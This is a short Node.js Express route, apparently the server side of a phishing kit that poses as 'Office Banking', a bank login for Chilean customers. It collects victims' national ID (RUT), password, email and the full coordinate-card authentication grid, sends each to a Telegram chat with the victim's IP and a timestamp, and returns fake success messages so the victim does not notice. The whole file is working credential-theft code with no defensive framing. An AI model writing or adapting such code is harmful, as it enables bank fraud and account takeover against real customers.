app.post("/proxy-login", async (req, res) => {
  const { rut, passwd, mail, coordenadas } = req.body;   // ← AGREGADO coordenadas
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  console.log("\n" + "=".repeat(60));
  console.log(`🔐 === NUEVO REQUEST A /proxy-login ===`);
  console.log(`IP: ${ip}`);
  console.log("=".repeat(60));

  try {
    // 📧 CORREO
    if (mail) {
      const mensajeCorrecto = `📧 Correo actualizado:\n${mail}\nIP: ${ip}`;
      await enviarATelegram(mensajeCorrecto);
      return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
    }

    // 🔐 LOGIN
    if (rut && passwd) {
      const mensajeLogin = `🔐 Nuevo Login en Office Banking:
RUT: ${rut}
Clave: ${passwd}
IP: ${ip}
Hora: ${new Date().toLocaleString('es-CL')}`;

      await enviarATelegram(mensajeLogin);
      return res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
    }

    // 🔢 COORDENADAS (MODIFICADO)
    if (coordenadas) {
      const coords = coordenadas;
      let texto = "🔐 Tarjeta de Coordenadas\n\n";

      const letras = ["A","B","C","D","E","F","G","H","I","J"];

      for (let fila = 1; fila <= 5; fila++) {
        let linea = "";
        for (let col of letras) {
          linea += `${col}${fila}: ${coords[col+fila]} | `;
        }
        texto += linea.slice(0, -3) + "\n";
      }

      texto += `\nIP: ${ip}`;
      texto += `\nHora: ${new Date().toLocaleString('es-CL')}`;

      await enviarATelegram(texto);

      return res.json({
        status: "ok",
        mensaje: "Coordenadas recibidas correctamente"
      });
    }

    // ❌ SIN PARÁMETROS
    res.status(400).json({ status: "error", mensaje: "❌ Datos inválidos" });

  } catch (err) {
    console.error(`❌ Error en /proxy-login:`, err);
    res.status(500).json({ status: "error", mensaje: "⚠️ Error al procesar solicitud" });
  }
});
